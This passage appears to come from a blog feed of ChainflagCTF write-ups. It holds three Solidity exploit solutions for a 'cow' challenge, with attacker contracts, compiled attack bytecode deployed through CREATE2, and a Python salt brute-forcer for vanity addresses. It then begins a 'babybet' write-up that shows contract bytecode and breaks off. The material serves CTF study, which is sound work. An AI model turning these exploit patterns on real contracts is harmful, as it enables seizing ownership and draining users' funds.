payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttacker&#123;</span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561000f575f80fd5b506105048061001d5f395ff3fe60806040526004361061002c575f3560e01c80634382e7961461002f578063d018db3e146100595761002d565b5b005b34801561003a575f80fd5b50610043610075565b60405161005091906103d3565b60405180910390f35b610073600480360381019061006e919061042b565b610098565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610144575f80fd5b505af1158015610156573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101c8575f80fd5b505af11580156101da573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610243575f80fd5b505af1158015610255573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bd575f80fd5b505af11580156102cf573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b8152600401610329906104b0565b5f604051808303815f87803b158015610340575f80fd5b505af1158015610352573d5f803e3d5ffd5b5050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61039b61039661039184610359565b610378565b610359565b9050919050565b5f6103ac82610381565b9050919050565b5f6103bd826103a2565b9050919050565b6103cd816103b3565b82525050565b5f6020820190506103e65f8301846103c4565b92915050565b5f80fd5b5f6103fa82610359565b9050919050565b61040a816103f0565b8114610414575f80fd5b50565b5f8135905061042581610401565b92915050565b5f602082840312156104405761043f6103ec565b5b5f61044d84828501610417565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f61049a600c83610456565b91506104a582610466565b602082019050919050565b5f6020820190508181035f8301526104c78161048e565b905091905056fea26469706673582212202c06fb75fa71e0d2a3e9a65775abb3b8da76e9a9caf57d1f38958f64af2b2dd664736f6c63430008140033&quot;;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>solution 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line">// CREATE2 was added to Inline assembler in version 0.5.2</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttack&#123;</span><br><span class="line">    bytes public attackCode = hex&quot;608060405260405161051b38038061051b83398181016040528101906100259190610347565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156100d1575f80fd5b505af11580156100e3573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610155575f80fd5b505af1158015610167573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101d0575f80fd5b505af11580156101e2573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561024a575f80fd5b505af115801561025c573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b81526004016102b6906103cc565b5f604051808303815f87803b1580156102cd575f80fd5b505af11580156102df573d5f803e3d5ffd5b50505050506103ea565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610316826102ed565b9050919050565b6103268161030c565b8114610330575f80fd5b50565b5f815190506103418161031d565b92915050565b5f6020828403121561035c5761035b6102e9565b5b5f61036984828501610333565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f6103b6600c83610372565b91506103c182610382565b602082019050919050565b5f6020820190508181035f8301526103e3816103aa565b9050919050565b610124806103f75f395ff3fe608060405260043610601e575f3560e01c80634382e79614602157601f565b5b005b348015602b575f80fd5b5060326046565b604051603d919060d7565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f60a560a1609d846069565b6088565b6069565b9050919050565b5f60b4826091565b9050919050565b5f60c38260ac565b9050919050565b60d18160bb565b82525050565b5f60208201905060e85f83018460ca565b9291505056fea264697066735822122028aa20ef563791f8bcf46fe2a77305c5a34faed84db654744d52b270c03ad0d564736f6c63430008140033&quot;;</span><br><span class="line">    bytes32 public attackCodeHash = &quot;&quot;;</span><br><span class="line">    </span><br><span class="line">    // before attack, we should update the attackCode,</span><br><span class="line">    // because the parameters should be add behide the bytecode</span><br><span class="line">    function getHash(address _addr) public returns(bytes32)&#123;</span><br><span class="line">        attackCode = abi.encodePacked(attackCode,abi.encode(_addr));</span><br><span class="line">        attackCodeHash = keccak256(attackCode);</span><br><span class="line">        return attackCodeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(bytes32 _salt) public payable&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // deploy the contract with 2 Ether</span><br><span class="line">            addr := create2(2000000000000000000, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>solution 3: not successful, TODO……how to use new(CREATE2)?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">//solution 3: not successful, TODO......how to use new(CREATE2)?</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow = Icow(0x6298e76001Fdd107735f040df8808864B8128722);</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttack&#123;</span><br><span class="line">    bytes public attackCode = hex&quot;6080604052736298e76001fdd107735f040df8808864b81287225f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550348015610062575f80fd5b50610504806100705f395ff3fe60806040526004361061002c575f3560e01c80634382e7961461002f578063d018db3e146100595761002d565b5b005b34801561003a575f80fd5b50610043610075565b60405161005091906103d3565b60405180910390f35b610073600480360381019061006e919061042b565b610098565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610144575f80fd5b505af1158015610156573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101c8575f80fd5b505af11580156101da573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610243575f80fd5b505af1158015610255573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bd575f80fd5b505af11580156102cf573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b8152600401610329906104b0565b5f604051808303815f87803b158015610340575f80fd5b505af1158015610352573d5f803e3d5ffd5b5050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61039b61039661039184610359565b610378565b610359565b9050919050565b5f6103ac82610381565b9050919050565b5f6103bd826103a2565b9050919050565b6103cd816103b3565b82525050565b5f6020820190506103e65f8301846103c4565b92915050565b5f80fd5b5f6103fa82610359565b9050919050565b61040a816103f0565b8114610414575f80fd5b50565b5f8135905061042581610401565b92915050565b5f602082840312156104405761043f6103ec565b5b5f61044d84828501610417565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f61049a600c83610456565b91506104a582610466565b602082019050919050565b5f6020820190508181035f8301526104c78161048e565b905091905056fea2646970667358221220e1d2efbe90c8e219de35c09dc2a463d1e09945a20a932d815526c1fc8bf7ac2a64736f6c63430008140033&quot;;</span><br><span class="line">    bytes32 public attackCodeHash = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    function getHash(address _addr) public returns(bytes32)&#123;</span><br><span class="line">        // attackCode = abi.encodePacked(type(AttackMan).creationCode,abi.encode(_addr));</span><br><span class="line">        // attackCodeHash = keccak256(attackCode);</span><br><span class="line">        attackCodeHash = keccak256(type(AttackMan).creationCode);</span><br><span class="line">        return attackCodeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(bytes32 _salt) public payable returns(address)&#123;</span><br><span class="line">        AttackMan x = new AttackMan&#123;salt:_salt&#125;();</span><br><span class="line">        return address(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calculate salt:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetSpecialAddressByCreate2</span>(<span class="params">DeployAddress: <span class="built_in">str</span>, BytecodeHash: <span class="built_in">str</span>, content: <span class="built_in">str</span>, potision:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        获得包含特定内容的地址，通过 create2。根据 create2原理写出来的</span></span><br><span class="line"><span class="string">        如果想让地址的某个位置是特定内容的值，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            DeployAttackAddress (str): 部署合约地址</span></span><br><span class="line"><span class="string">            BytecodeHash (str): 待部署的合约的 bytecode的 hash 值</span></span><br><span class="line"><span class="string">            content: 包含的某个特定的值</span></span><br><span class="line"><span class="string">            position(可选)：地址的某个位置是特定内容的值，默认是0，可手动调整，比如 content=&#x27;ab&#x27;,position=-2就是计算得到的地址的后两位是&#x27;ab&#x27;，第position位是之后的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">             str: 第一个是 salt值，第二个是地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        例子： BlockchainUtils.GetSpecialAddressByCreate2(&quot;406187E1b3366B5da3539D99C4E88E42FC60De50&quot;,&quot;da647010355608442b3eab68e7dcc6d5b836f2628d2366ff8ae853413a643965&quot;,&quot;5a54&quot;)</span></span><br><span class="line"><span class="string">              得到的地址包含 &#x27;5a54&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            start_time = time.time()  <span class="comment"># 获取当前时间戳</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">                current_time = time.time()</span><br><span class="line">                elapsed_time = current_time - start_time</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">&quot;time out,maybe a wrong position&quot;</span>)</span><br><span class="line"></span><br><span class="line">                salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                s = <span class="string">&#x27;0xff&#x27;</span> + DeployAddress + salt + BytecodeHash</span><br><span class="line">                hashed = Web3.keccak(hexstr=s)</span><br><span class="line">                address = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])[<span class="number">24</span>:]</span><br><span class="line">                <span class="keyword">if</span> potision == <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision &gt; <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:potision+<span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision &lt; <span class="number">0</span> <span class="keyword">and</span> potision != -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:potision + <span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision + <span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision == -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:-1] \n[address] 0x<span class="subst">&#123;address&#125;</span> \n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            ExceptionInformation = format_exc()</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2] Failed\n[content] <span class="subst">&#123;content&#125;</span>\n <span class="subst">&#123;ExceptionInformation&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>*<span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BlockchainUtils.GetSpecialAddressByCreate2(<span class="string">&#x27;d8b934580fcE35a11B58C6D73aDeE468a2833fa8&#x27;</span>,<span class="string">&#x27;05810939c4d8e77c7017e7d39d35a9daf5ae7ced61ab83230b39e90ea4b95123&#x27;</span>,<span class="string">&#x27;525b&#x27;</span>,-<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.air-hunting @babybet</title>
      <link href="/2023/07/13/02.ChainflagCTF/10.air-hunting%20@babybet/"/>
      <url>/2023/07/13/02.ChainflagCTF/10.air-hunting%20@babybet/</url>
      
        <content type="html"><![CDATA[<h1 id="air-hunting-babybet"><a href="#air-hunting-babybet" class="headerlink" title="air-hunting(babybet)"></a>air-hunting(babybet)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6080604052600436106100775763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663645b8b1b811461009857806366d16cc3146100d85780637365870b146100ef5780638c0320de14610107578063e3d670d71461019e578063f0d25268146101cc575b3360009081526020819052604090208054670de0b6b3a76400003404019055005b3480156100a457600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff600435166101fd565b60408051918252519081900360200190f35b3480156100e457600080fd5b506100ed61020f565b005b3480156100fb57600080fd5b506100ed60043561024c565b34801561011357600080fd5b506040805160206004803580820135601f81018490048402850184019095528484526100ed94369492936024939284019190819084018382808284375050604080516020601f89358b018035918201839004830284018301909452808352979a9998810197919650918201945092508291508401838280828437509497506102e29650505050505050565b3480156101aa57600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff6004351661047d565b3480156101d857600080fd5b506100ed73ffffffffffffffffffffffffffffffffffffffff6004351660243561048f565b60016020526000908152604090205481565b336000908152600160205260409020541561022957600080fd5b336000908152602081815260408083208054600a01905560019182905290912055565b336000908152602081905260408120548190600a111561026b57600080fd5b3360009081526001602052604090205460021161028757600080fd5b5050336000908152602081905260409020805460091901905543600019014060038106828114156102ca5733600090815260208190526040902080546103e80190555b50503360009081526001602052604090206002905550565b33600090815260208190526040902054620f4240111561030157600080fd5b60025473ffffffffffffffffffffffffffffffffffffffff16331461033157336000908152602081905260408120555b60025460405173ffffffffffffffffffffffffffffffffffffffff90911690303180156108fc02916000818181858888f19350505050158015610378573d6000803e3d6000fd5b507f6335b7f9c4dff99c3a870eaf18b802774df3aba4e21b72549f3a03b6bc974c908282604051808060200180602001838103835285818151815260200191508051906020019080838360005b838110156103dd5781810151838201526020016103c5565b50505050905090810190601f16801561040a5780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b8381101561043d578181015183820152602001610425565b50505050905090810190601f16801561046a5780820380516001836020036101000a031916815260200191505b5094505050505060405180910390a15050565b60006020819052908152604090205481565b336000908152602081905260409020548111156104ab57600080fd5b336000908152602081905260408082208054849003905573ffffffffffffffffffffffffffffffffffffffff93909316815291909120805490910190555600a165627a7a723058207958bdc84ae120b218d0987fdff009a5dbca73d76271563852fd4b0550efa3790029</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 